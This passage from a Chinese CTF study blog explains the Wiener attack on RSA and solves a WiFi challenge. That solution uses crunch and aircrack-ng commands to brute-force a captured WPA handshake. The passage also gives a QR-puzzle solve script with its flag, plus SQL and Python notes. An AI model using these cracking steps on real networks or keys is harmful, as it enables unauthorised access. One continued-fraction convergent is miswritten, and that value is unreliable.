    <content type="text"><![CDATA[☛ 前言：在做过了有关Crypto的两大题目（都是有关RSA）后，并在学习了《图解密码技术》中有关RSA的知识点后，我这里两天一直在尝试解Wiener Trick这道题目，在成功解出之后，并对其背后的原理又进行了学习和了解，那么今天我要认真的总结一下这道题背后的原理和知识点吧，明天再将解题的过程总结一下。 一、前期准备 Wiener 攻击的原理 RSA加密的原理 连分数的知识点 二、思考问题1. 通过RSA2这道题目可以知道，我们可以从公钥推导出私钥（n和e较小），那么除了上道题目的方法外，还有别的攻击方法吗？ 答：当然有，这个方法就是我们在题目中所用的Wiener攻击方法。 2. Wiener攻击方法的原理是什么 答：因为e和d是通过公式：e * d mod Φ(n) = 1产生了联系，Wiener攻击也是利用了这个公式，可以对RSA进行攻击（前提是： d &lt; $ \frac{1}{3} $ $ N^\frac{1}{4} $），稍后我将会详细讲解这个有关知识。 3. 连分数和Wiener有什么联系？ 答：连分数在这里的作用，其实就是通过上问的公式，求得关键参数 d的，具体的细节我会在下文详述； 三、知识详解1.连分数介绍 ① 概念&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;连分数又称为特殊分繁数，如果a0，a1，a2，…an，…都是整数，则将分别称为无限连分数和有限连分数。② 形式③ 连分数的性质 一个数的连分数表示是有限的，当且仅当这个数是有理数； 对于两个数辗转相除，最终会停在两个数的最大公约数上； 任何有理数的连分数表示是唯一的，如果它没有尾随的1； 无理数的连分数表示是唯一的； 数x的截断连分数表示很早产生x的在特定意义上“最佳可能”的有理数逼近； 最后一个性质非常重要，且传统的小数点表示就不能如此。数的截断小数表示产生这个数的有理数逼近，但通常不是非常好的逼近。例如，截断$ {\displaystyle {\frac {1}{7}}=0.142\ 857\ldots }$ ${\displaystyle {\frac {1}{7} }=0.142\ 857\ldots}$在各种位置上产生逼近比，如$ {\displaystyle {\frac {142}{1000}}}$ ${\displaystyle {\frac {142}{1000}}}$、 ${\displaystyle {\frac {14}{100} } }$ $ {\displaystyle {\frac {14}{100}}}$和$ {\displaystyle {\frac {1}{10}}}$。但是明显的最佳有理数逼近是“$ {\displaystyle {\frac {1}{7}}}$”自身。④ 连分数的渐近分数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是一个重要的概念！！对于连分数，我们观察每一个分母，它后面加的那一项都小于1，所以相比 ai 是一个非常小的数，如果我们把第 i 个分母后面的分数全部略去，我们称这个分数为这个连分数第 i 个渐进分数，显然 i 越大离 x 越接近，并且由于约去了分母前 n-1 个渐进分数都是小于 x 的（在求 d 的时候就是利用这一个性质）。⑤ 实例 a = $ \displaystyle{\frac{415}{93} = 4 + \frac{1}{2+\frac{1}{6 + \frac{1}{7}}}} $ a 的渐近分数为：4，$ {\displaystyle{\frac{2}{9} (4 + \frac{1}{2}}})$，${\displaystyle{\frac{58}{13} (4 + \frac{1}{2+\frac{1}{6}}})}$，${\displaystyle{\frac{415}{93} (4 + \frac{1}{2+\frac{1}{6+\frac{1}{7}}}})}$ 2.Wiener Attack 原理 ① 分析RSA的加密原理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于RSA的原理，我在前面几篇文章里已经写的很详细了，今天重点来说 “ 如何通过不分解大整数 ‘N’ ，来得到私钥的 ‘d’ ”：【分析】&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d 是通过e * d mod φ(N) = 1[1]公式产生的，而e、N是已知的，然而N和φ(N)又有着一定的联系：φ(N) = (p-1)(q-1) = p*q-(p+q)+1 = N-(p+q)+1[2]，我们知道N很大，所以对于p和q也相对较大，那么p*q的值是远大于p+q的，因此我们可以在这里φ(N) ≈ N；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上段的分析我们可以得出[1]式的三个变量，那么现在我们将[1]式进行变形，变形为k * φ(N) = e * d - 1，再将该式两边除以d * φ(N)，得到下面的式子： $\displaystyle{\frac{k}{d} = \frac{e}{φ(N)} - \frac{1}{dφ(N)}} $因为 φ(N) ≈ N，所以又得到下面的式子： $\displaystyle{\frac{k}{d} = \frac{e}{N} - \frac{1}{dφ(N)}} $因为d * φ(N)得到的值很大，上述的式子可以这样理解：$\displaystyle{\frac{e}{N}}$是一个比$\displaystyle{\frac{k}{d}}$稍微大的数，既然我们已经得到这样的性质，那么怎么通过$\displaystyle{\frac{e}{N}}$求$\displaystyle{\frac{k}{d}}$，进而求得 d 呢？② 如何通过$\displaystyle{\frac{e}{N}}$求$\displaystyle{\frac{k}{d}}$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在我们就用到上文所提到的 “连分数” 的性质了，通过求$\displaystyle{\frac{e}{N}}$渐进分数，而且渐近分数有一个这样的性质分母前 n-1 个渐进分数都是小于 x 的，也就是说假如$\displaystyle{\frac{e}{N}}$有 an 个渐近分数，那么： 前 an-1 个渐近分数都小于 $\displaystyle{\frac{e}{N}} $的值！ 前 an-1 个渐近分数都小于 $\displaystyle{\frac{e}{N}} $的值！ 前 an-1 个渐近分数都小于 $\displaystyle{\frac{e}{N}} $的值！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也就是说 $ \displaystyle{\frac{e}{N}} $的前 an-1 个渐近分数中的值肯定有一个是 $ \displaystyle{\frac{k}{d}} $ 的值；③ 怎么确定 $ \displaystyle{\frac{k}{d}} $ 的值？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ \displaystyle{\frac{e}{N}} $ 的渐进数可能会有很多情况，那么我们怎么确定哪个渐进数是 $ \displaystyle{\frac{k}{d}} $ 的值呢？这个时候我们就要将所有的情况（k，d）带入e * d - 1 = k * φ(N)式中，就得到了 φ(N) 的值%%#￥@@（#……#%@%￥￥@%@…………思路太乱了，算了直接上数学做题思路： ∵ 求得了 k、d 的 n-1 个值∴ 也就有 n-1 个 φ(N) 的值∵ φ(N) = (p-1) * (q-1) = pq - (p+q) + 1 = N - (p+q) + 1∵ φ(N) 已求出 且 N 已知∴ p + q = N - φ(N) + 1 &nbsp;&nbsp;&nbsp;&nbsp;(x1 + x2 = N - φ(N) + 1)∵ p * q = N &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(x1 * x2 = N )∴ 通过韦达定理可得： x2 - ( N - φ(N) + 1)x + N = 0&nbsp;&nbsp;&nbsp;&nbsp;将 n-1 个 φ(N) 的值分别代入该式，如果能够求得 x1 和 x2的有效解，那么 x1 和 x2 就是 p 、q 的值，也就可以确定 k、d 的值； 四、参考网站 Crypto Classics: Wiener’s RSA Attack[WiKi]Wiener’s attack[WiKi]连分数[CSDN]RSA攻击之wiener攻击[知乎]受RSA和强攻wiener 五、学习感悟 这道题是我首次感受到了密码题和数学的关联如此之大，让我开始思考以前所学数学的意义，以及以后对待数学的态度。这次做题让我真真切切的感受到了数学不是空理论，而是一切的理论基础。今后我将会继续努力学习数学，继续探索数学的奥秘。 六、每日一句 从不奢求生活能给予我最好的，只是执着于寻求最适合我的！]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL学习笔记（一）查询(1)]]></title>
    <url>%2F2019%2F05%2F05%2F2019.05.05%EF%BC%8851%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：大学本科期间也学习过SQL的知识，但是有些只是点已经忘记，前几天做SQL注入的时候感觉挺费劲的，所以这两天学习了一下MySQL有关查询的常用语句，今天主要对此进行总结。 一、基本查询1.语句格式：select * from 说明：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用select查询的基本语句 select * from &lt;表名&gt;可以查询一个表的所有行和所有列的数据 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;select查询的结果是一个二维表； 二、条件查询1.语句格式： select * from where 2.条件表达式的中的条件： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一种条件：and条件表达式可以用&lt;条件1&gt; AND &lt;条件2&gt;表达满足条件1并且满足条件2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二种条件：or第二种条件是&lt;条件1&gt; OR &lt;条件2&gt;，表示满足条件1或者满足条件2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三种条件：NOT（不常用）第三种条件是NOT &lt;条件&gt;，表示“不符合该条件”的记录上述条件的优先级： NOT > AND > OR 对于条件表达式中出现的字串需要单引号括起来。 三、投影查询1.语句格式： select 列1，列2... from…… 使用列名时，还可以给每一列起一个名字，格式如下：select 列1 别名1，列2 别名2，列名3 别名3 from…… 2.小结 使用SELECT * 表示查询表的所有列，使用SELECT 列1, 列2, 列3则可以仅返回指定列，这种操作称为投影。 SELECT语句可以对结果集的列进行重命名 四、排序查询1.语句格式 select * from where order by 2.注意 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;默认是从低到高排序（ASC），如果加上DESC，则是按照从高到低排序；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;语句中要有where子句，则order by 子句要放到where子句后面； 五、分页查询1.语句格式 select * from limit < M > offset < N >有关计算：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LIMIT 总是设定为 pageSize；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OFFSET计算公式为 pageSize * (pageIndex - 1)； 2.实例 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要获取第1页的记录，可以使用LIMIT 3 OFFSET 0： Select id,name,gender,score from students order by score DESC **limit 3 offset 0**;上述查询LIMIT 3 OFFSET 0表示，对结果集从0号记录开始，最多取3条。注意SQL记录集的索引从0开始。如果要查询第2页，那么我们只需要“跳过”头3条记录，也就是对结果集从3号记录开始查询，把OFFSET设定为3：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要获取第2页的记录，可以使用LIMIT 3 OFFSET 3; Select id,name,gender,score from students order by score DESC **limit 3 offset 3**;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要获取第3页的记录，可以使用LIMIT 3 OFFSET 6： Select id,name,gender,score from students order by score DESC **limit 3 offset 6**;上述查询LIMIT 3 OFFSET 0表示，对结果集从0号记录开始，最多取3条。注意SQL记录集的索引从0开始。如果要查询第2页，那么我们只需要“跳过”头3条记录，也就是对结果集从3号记录开始查询，把OFFSET设定为3;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要获取第4页的记录，可以使用LIMIT 3 OFFSET 9; Select id,name,gender,score from students order by score DESC **limit 3 offset 9**;由于第4页只有1条记录，因此最终结果集按实际数量1显示。LIMIT 3表示的意思是“最多3条记录” 3.注意的点 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OFFSET是可选的，如果只写LIMIT 15，那么相当于LIMIT 15 OFFSET 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在MySQL中，LIMIT 15 OFFSET 30还可以简写成LIMIT 30, 15;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用LIMIT OFFSET 分页时，随着N越来越大，查询效率也会越来越低; 六、聚合查询1.语句格式 select count(*) from ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count( )是SQL内置的函数查询]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc：RealWiFi解题总结]]></title>
    <url>%2F2019%2F04%2F29%2F2019.04.29%EF%BC%8850%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：今天把昨天做的题目“RealWiFi”总结一下。这道题目主要是一些工具的使用，但也涉及了相关连接wifi时的知识点，今天就主要的来总结一下有关内容。 一、前期准备 crunch 生成字典 aircrack-ng工具 wireshark工具二、解题思路 首先先观察题目给的流量包，看看都有什么协议； 根据第一步，然后针对协议的特点做出相应的判断； 从第二步可知，这个过程是一个网络接入的过程，应该是让我们找到密码； 根据题目提示写出字典； 暴力破解得到密码； 但是题目中说密码不是flag，可能要用这个密码解开数据包，得到明文；三、解题步骤1.观察流量包用wireshark打开数据包，观察到流量包的格式为:EAPOL和802.11：于是我去查阅了一下有关EAPOL协议的内容，主要用于网络接入认证。由此我们可以知道这个流量包是一在连接wifi的时候抓取的，而且wifi的SSID为Blue_Whale。2.分析流量对于这道题给出的提示来看，再加上第一步的分析，可以知道题目让我们通过破解该数据包，得到wifi的密码。3.写出字典首先要思考的问题是，密码的长度是多少？密码的组合是什么？根据题目给的提示：“密码较弱”，然后根据资料密码最短为“8”位，所以我猜测密码可能是由8个数字所组成，然后我用crunch生成字典：`crunch 8 8 -t %%%%%%%% >> password.txt`4.暴力破解根据我们写的字典，然后用aircrack-ng对其进行暴力破解：`aircrack-ng -a2 -wifi.pcap -w password.txt` 在第18分41秒的时候，终于破解成功如下图：5.破解流量包，得到明文在查了相关的资料后，在已知wifi密码后，可以用下面的方法破解流量包，然后得到明文：6.分析明文，得到flag对于解密后的流量包，我们可以看到产生了HTTP、TCP等协议，我首先想到的是分析HTTP协议，因为他传输的都是明文，最终在POST中找到了Flag四、参考资料因为本题所涉及的知识较多，我将一些我认为比较全面的参考资料贴出来，方便以后查阅和学习： crunch的详细总结 aircrack-ng详细总结 EAPOL协议详细总结五、学习感悟虽然今天总结了一下这个题目，但是还是感觉有些知识没有掌握，一些命令的用法没有理解。我有了个新的想法，根据我以前做出来的题目，我要将每道题目所涉及的知识点再复习一下，对于一些未能掌握，或者还不够熟悉的知识点进行总结和归纳，然后将这些盲区彻底搞懂。六、每日一句坚持了这么久，也成为了一种习惯。]]></content>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Another 01game解题详细总结]]></title>
    <url>%2F2019%2F04%2F28%2F2019.04.28%EF%BC%8849%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：今天认真的将昨天的题目整理了一下，下面我就总结一下有关的知识点吧。 一、前期准备 python语言 二维码的知识（本题中不是重点） QQ “扫一扫”二、思考过程 题目中提示统计0和1的数量，那么首先就要统计一下题目中0 1字符串的数量； 然后看一下这个数量值，是否是一个数的平方； 如果是一个数的平方，那么就将这个字符串排成一个正方形； 题目中提示可以组成一个二维码，那么就要思考生成的正方形怎么像一个二维码； 根据上一步的思考，我们可以有选择地进行替换图形； 扫描生成的二维码，看得到什么消息；（还是一个 0 1 字符串） 根据题目提示，可以将字符串当作ASCII码编程，解出flag； 以上的思路是根据题目的提示，以及自己在具体操作过程中所得到的。注：以下全由Python编程而得 三、解题步骤1.统计0和1的数量123456789101112131415num = 111011101100011011111010000000011111011011101111001100100101011111001000101011011101101000101010101000100100010110110011001101001010010100010010001011011001101000101010001010001001111101110001000011001010111101111100000000101010101010101010101010000000111111110110111010101100000011111111100010000011101110101010101010001110110001101110100010001010010100101010101011111001110010000110111000011110100111100011011100010110101001011101101001110100101101100101100110110110100010010010100100110010101110101010101010111111000000110111100001100111101000101001101110101110101110001010001010010011110010101011100010101111101001001101000111101000100110101010010011001010110000100000100010110010101010111010100101110101000100101110101010111010100000100000011001101010100011111010010100101011001100101010101110100100100100010010101101111010100111011001001001100010110011101000011110101110001011100000011110111010110001011111000010110001101110001001001010111101101000001111100111001000100110110100001101011001011011010001000011001011001100000010111000110110001011001010100000100011111111000011001010110011000111001010000000100111011101101110001010101000011111010100111001101010110101110001001000101001101110011001111100000001010100010110000011000011101010001000100010001010000010101001010101101000001001111101001100000101100011101000100110000000100101100100011011011001010110str_num = &apos;%d&apos;%num # 将 num 转换为字符串 ##################### 判断整个字符串的长度 ######################### 将 0 1 字符串看作一个大的数值，对其除 10 求整，每除一次长度加一，直到退出while循环体；# length = i + 7，这是因为在num前面还有 7 个 0，因为所以长度要加 7 ；i = 0while(num): num = num // 10 i += 1;length = i + 7print(&quot;\nThe length of string is:&quot;,length,end=&apos;\n\n&apos;) 输出的结果为：The length of string is: 1369，说明题目所给的字符串的长度为1369. 2.找出平方为字符串长度的数1234567################### 将长度分成两个相同的数相乘 ######################for n in range(30,40): mu = n * n if length == mu: print(n,&apos;*&apos;,n,&apos;=&apos;,length,end=&apos;\n\n&apos;) # n * n = 题目中字符串长度； qrcode = n 输出的结果为：37 * 37 = 1369，说明可以排成 37 × 37 的的正方形。 3.将这些0和1排成一个正方形123456789101112131415161718#################### 根据参数输出二维码的图形 #######################for index in range(0,qrcode): # 外层循环控制 “行”，行数 = qrcode； if index == 0: # 控制第 “1” 行输出； print(&apos;0000000&apos;,end=&apos;&apos;) # 对于第一行，前面有 7 个 0，需要补上，先打印出来，控制第 “1” 行的前 “7” 个字符的输出； for sec in range(0,qrcode - 7): # 相比题目中给的字符串的位置，num 中数位置均 - 7，而这种差距是在第一行出现的，所以要把第一行的情况单独列出来；控制第 “1” 行后 “30” 个字符的输出； if str_num[sec] == &apos;1&apos;: # 判断字符是否为“1”，如果是则打印“1”； print(&apos;1&apos;,end=&apos;&apos;) else: print(&apos;0&apos;,end=&apos;&apos;) # 字符为“0”，则打印 “0” ； print(end=&apos;\n&apos;) else: # 分析第 [2,37] 行的情况； for sec in range(0,qrcode): # 控制 “2—37” 行的 “1—37” 列的的输出 if str_num[sec + index * qrcode - 7] == &apos;1&apos;: # sec + index * qrcode 是将题目中的字符串每行按照 qrcode的长度进行分行；sec + index * qrcode - 7 因为num和题目给的字符串的下标差 7（校正值） ，所以需要校正； print(&apos;1&apos;,end=&apos;&apos;) # 判断字符是否为“1”，如果是则打印“1”； else: print(&apos;0&apos;,end=&apos;&apos;) # 字符为“0”，则打印 “0” ； print(end=&apos;\n&apos;) 输出结果如下图： 4.观察 0 和 1 的排布情况将上面的图片经过简单的处理，得到下图：从上面的图片中可以隐约的看到一个二维码的轮廓 5.输出二维码 我将python输出的 0 和 1 ，分别用“■”和“ ”（两个空格）代替得到下图：但是从上图却没有扫出结果，于是我又对控制台的设置做了修改，如下图： 6.扫描二维码扫描二维码得到如下的结果：110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101 7.根据结果得到flag1234567891011121314151617181920str_num = &apos;110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101&apos;num = int(str_num) # 生成一个字符串类型和一个数据类型length = len(str_num) # 计算result的长度print(&quot;\n\tThe length of result is:&quot;,length,end=&apos;\n\n&apos;) # 打印长度for n in range(4,8): # ASCII码一般是由8位组成，这里是来查看result是由几位构成一个ASCII码 if length % n == 0: print(&quot;\tThe ASCII&apos;length is:&quot;,n,end=&apos;\n\n&apos;) # 得出 n 位构成一个ASCII码 sec = n mul = length // n # 有几个ASCII码构成String = [] # 定义一个数据类型for index in range(0,mul): # 将字符串分为 mul 个短的字符串 n = num % 10000000 # 从字符串的尾到首，每 7 位分开；！！！需要优化！！！ num = num // 10000000 # 将num重新赋值 str_n =&apos;%d&apos;%n # 将取出来的7位0 1 数字转换位字符串 String.append(chr(int(str_n,2))) # 将 0 1 字符串转换为十进制，然后再转换为字符，赋值给String数组；print(&apos;\tThe flag is:\t&apos;,end=&apos;&apos;)for index in range(0,mul): # 倒序输出String的字符，就是所得的flag； print(String[mul - index - 1],end=&apos;&apos;)print(&apos;\n\n&apos;) 该脚本输出的结果如下图：那么所要求得的结果为：flag{y0U_KNOW_ab0ut_qRC0d3} 8.完整的Python脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071############################ 根据题目所给的0 1字符串，得二维码 ####################num = 111011101100011011111010000000011111011011101111001100100101011111001000101011011101101000101010101000100100010110110011001101001010010100010010001011011001101000101010001010001001111101110001000011001010111101111100000000101010101010101010101010000000111111110110111010101100000011111111100010000011101110101010101010001110110001101110100010001010010100101010101011111001110010000110111000011110100111100011011100010110101001011101101001110100101101100101100110110110100010010010100100110010101110101010101010111111000000110111100001100111101000101001101110101110101110001010001010010011110010101011100010101111101001001101000111101000100110101010010011001010110000100000100010110010101010111010100101110101000100101110101010111010100000100000011001101010100011111010010100101011001100101010101110100100100100010010101101111010100111011001001001100010110011101000011110101110001011100000011110111010110001011111000010110001101110001001001010111101101000001111100111001000100110110100001101011001011011010001000011001011001100000010111000110110001011001010100000100011111111000011001010110011000111001010000000100111011101101110001010101000011111010100111001101010110101110001001000101001101110011001111100000001010100010110000011000011101010001000100010001010000010101001010101101000001001111101001100000101100011101000100110000000100101100100011011011001010110str_num = &apos;%d&apos;%num # 将 num 转换为字符串 ##################### 判断整个字符串的长度 ######################### 将 0 1 字符串看作一个大的数值，对其除 10 求整，每除一次长度加一，直到退出while循环体；# length = i + 7，这是因为在num前面还有 7 个 0，因为所以长度要加 7 ；i = 0while(num): num = num // 10 i += 1;length = i + 7print(&quot;\nThe length of string is:&quot;,length,end=&apos;\n\n&apos;)################### 将长度分成两个相同的数相乘 ######################for n in range(30,40): mu = n * n if length == mu: print(n,&apos;*&apos;,n,&apos;=&apos;,length,end=&apos;\n\n&apos;) # n * n = 题目中字符串长度； qrcode = n#################### 根据参数输出二维码的图形 ######################## 行数和列数均为 qrcode；# 用 “■” 来代替 0，用“ ”(两个空格)来代替 1； for index in range(0,qrcode): # 外层循环控制 “行”，行数 = qrcode； if index == 0: # 控制第 “1” 行输出； print(&apos;■■■■■■■&apos;,end=&apos;&apos;) # 对于第一行，前面有 7 个 0，需要补上，先打印出来，控制第 “1” 行的前 “7” 个字符的输出； for sec in range(0,qrcode - 7): # 相比题目中给的字符串的位置，num 中数位置均 - 7，而这种差距是在第一行出现的，所以要把第一行的情况单独列出来；控制第 “1” 行后 “30” 个字符的输出； if str_num[sec] == &apos;1&apos;: # 判断字符是否为“1”，如果是则用“ ”代替； print(&apos; &apos;,end=&apos;&apos;) else: print(&apos;■&apos;,end=&apos;&apos;) # 字符为“0”，则用“■” 来代替； print(end=&apos;\n&apos;) else: # 分析第 [2,37] 行的情况； for sec in range(0,qrcode): # 控制 “2—37” 行的 “1—37” 列的的输出 if str_num[sec + index * qrcode - 7] == &apos;1&apos;: # sec + index * qrcode 是将题目中的字符串每行按照 qrcode的长度进行分行；sec + index * qrcode - 7 因为num和题目给的字符串的下标差 7（校正值） ，所以需要校正； print(&apos; &apos;,end=&apos;&apos;) # 字符为“1”，如果是则用“ ”代替； else: print(&apos;■&apos;,end=&apos;&apos;) # 字符为“0”，则用 “■” 来代替； print(end=&apos;\n&apos;)############################ 根据结果，求得ASCII码相应的字符 ####################str_num = &apos;110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101&apos;num = int(str_num) # 生成一个字符串类型和一个数据类型length = len(str_num) # 计算result的长度print(&quot;\n\tThe length of result is:&quot;,length,end=&apos;\n\n&apos;) # 打印长度for n in range(4,8): # ASCII码一般是由8位组成，这里是来查看result是由几位构成一个ASCII码 if length % n == 0: print(&quot;\tThe ASCII&apos;length is:&quot;,n,end=&apos;\n\n&apos;) # 得出 n 位构成一个ASCII码 sec = n mul = length // n # 有几个ASCII码构成String = [] # 定义一个数据类型for index in range(0,mul): # 将字符串分为 mul 个短的字符串 n = num % 10000000 # 从字符串的尾到首，每 7 位分开；！！！需要优化！！！ num = num // 10000000 # 将num重新赋值 str_n =&apos;%d&apos;%n # 将取出来的7位0 1 数字转换位字符串 String.append(chr(int(str_n,2))) # 将 0 1 字符串转换为十进制，然后再转换为字符，赋值给String数组；print(&apos;\tThe flag is:\t&apos;,end=&apos;&apos;)for index in range(0,mul): # 倒序输出String的字符，就是所得的flag； print(String[mul - index - 1],end=&apos;&apos;)print(&apos;\n\n&apos;) 四、学习感悟 其实这个题目没有那么难，但是因为自己要写脚本，所以花费的时间相对多的很多，但是这个过程带给我的收获确实很大的，一边学习了python，又解决了问题，蛮好的。在以后的解题种，我还将继续争取自己写脚本，解出题目。 五、每日一句对于攀登者来说，失掉往昔的足迹并不可惜，迷失了继续前时的方向却很危险。]]></content>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 学习笔记（一）]]></title>
    <url>%2F2019%2F04%2F27%2F2019.04.27%EF%BC%8848%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：今天在做第二阶段的 02 号题目，可是一点思路也没有。转而去做了 Misc 的 Another 01 game，经过一段时间的思考和实践，终于将这道题做了出来，但是总结笔记还没有准备好素材。那么今天就主要总结一下python的学习笔记吧。 一、第一个Python程序1.介绍： 命令行模式：可以执行.py文件 Python交互模式：在交互模式环境，也可以执行.py文件 2 10 = 20 ；2 * 10 = 1024 ;2.使用文本编辑器： 在windows上不可以直接运行.py文件，但是在Mac和Linux上是可以直接运行的;3.输入和输出： 输出：a. 输出格式：print() 这里的括号必须加上；b. Print()函数也可以接受多个字符，用逗号隔开：print(‘a’,’c’,’c’)，打印出来的效果为a c c 输入：a. 输入格式：input()b. 打印变量c. input() 提示：input(‘please input your name:’) 2.Python基础——数据类型和变量 类型：a. 整数：十六进制的表示方法：前缀为0xb. 浮点数：小数点的位置是可以改变的，1.23*10^9 = 1.23e9c. 字符串：&nbsp;&nbsp;&nbsp;&nbsp;i. 单引号或者双引号括起来的文本；&nbsp;&nbsp;&nbsp;&nbsp;ii. 如果要输入的内容为‘name’，则输入时因用双引号：“‘name’”；&nbsp;&nbsp;&nbsp;&nbsp;iii. 如果字符串内部既包含单引号，又包含双引号，那么要用转义字符\来标识；&nbsp;&nbsp;&nbsp;&nbsp;iv. 转义字符 \ ：可以转义很多字符，\（在行尾时）表示续行符；\ n表示换行等等。&nbsp;&nbsp;&nbsp;&nbsp;v. 如果字符串里面有很多字符都需要转移，python允许使用 r’ ‘ 表示’ ‘ 内部的字符串默认不转义&nbsp;&nbsp;&nbsp;&nbsp;vi. 如果字符串内部有很多换行，python允许用 ‘’’…’’’的格式表示多行内容,如： 1234567print(&apos;&apos;&apos;line1line2line3&apos;&apos;&apos;)输出结果为：line1 line2 line3 类型：&nbsp;&nbsp;&nbsp;&nbsp;vii. 多行字符串 ‘’’…’’’ 还可以在前面加上 r 使用（直接写 r 就行）d. 布尔值：&nbsp;&nbsp;&nbsp;&nbsp;i. 布尔值在python中的表示格式为：True 和 False 第一个字符必须要大写&nbsp;&nbsp;&nbsp;&nbsp;ii. 布尔值可以用 and、or 和 not 运算：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1) and（与运算）：只有所有都为True，结果才能为True；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2) or（或运算）：只要其中有一个True，结果就是True；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3) not（是非运算）：单目运算符，把False变为True，把True变为False；&nbsp;&nbsp;&nbsp;&nbsp;e. 空值：空值在Python中用None来表示，不能把None理解为 0 ，因为 0 是有意义的，而None是一个特殊的空值f. 变量：变量名必须是大小写英文、数字和 _ 的组合，且不能用数字开头，变量在内存中的表示： a = ‘ABC’&nbsp;&nbsp;&nbsp;&nbsp;i. 在内存中创建了一个 ‘ABC’ 的字符串；&nbsp;&nbsp;&nbsp;&nbsp;ii. 在内存中创建了一个名为 a 的变量，并把它指向 ‘ABC’g. 常量：所谓的常量就是不能变的常量&nbsp;&nbsp;&nbsp;&nbsp;i. 比如 PI = 3.141592653589793 ，但事实上PI仍然是个变量，如果一定要用PI作为变量名，那么 PI 的值为你赋给它的&nbsp;&nbsp;&nbsp;&nbsp;ii. 除法：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1) / ：除法结果时浮点数，即使是两个整数恰好相除，结果也是浮点数：9 / 3=3.0 10/3=3.333333333333335&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2) // ：称为地板除，也就是C里面的取整：10 // 3 = 3 ； 三、每日一句人生目标确定容易实现难，但如果不去行动，那么连实现的可能也不会有。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识 Caesar 密码]]></title>
    <url>%2F2019%2F04%2F26%2F2019.04.26%EF%BC%8847%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：今天看《图解密码技术》中，学习了有关Caesar密码的知识，今天就主要说一下有关Caesar密码的知识点。 一、认识Caesar密码在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术，是以罗马共和时期恺撒的名字命名的。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母a（小写代表明文）将被替换成D（大写代表密文），B变成E，以此类推吗，如下图： 二、Caesar密码的加密Caesar密码加密是根据“密钥”（偏移量），将26个字母的对应顺序依次后移，例如上图所示（偏移量为 3 ）。偏移量的取值有25中可能，所以有25中对应关系，也就有25个密钥；它的加密情况属于“替换加密”的简单的一种。例如：以上图为例，我们要对“wearefamily”用Caesar进行加密： w —&gt; Z e —&gt; H a —&gt; D r —&gt; U e —&gt; H f —&gt; I a —&gt; D m —&gt; P i —&gt; L l —&gt; O y —&gt; B 那么加密后的密文为：ZHDUHIDPLOB。在不知怎么样加密的情况下，我们完全读不懂该字符串的意思。 三、Caesar密码解密Caesar密码的解密，关键在于找到“密钥”，也就是上文所说的偏移量。在不能得到偏移量的情况下，我们可以使用暴力破解的方法进行破解，也就是将25种情况全部尝试，然后再观察结果。说明：在所有的实例中，将小写字母代表明文，大写字母代表密文； 1.Caesar 25 种密钥求25种密钥的算法如下：1234567891011121314151617181920212223242526############## 构造的函数 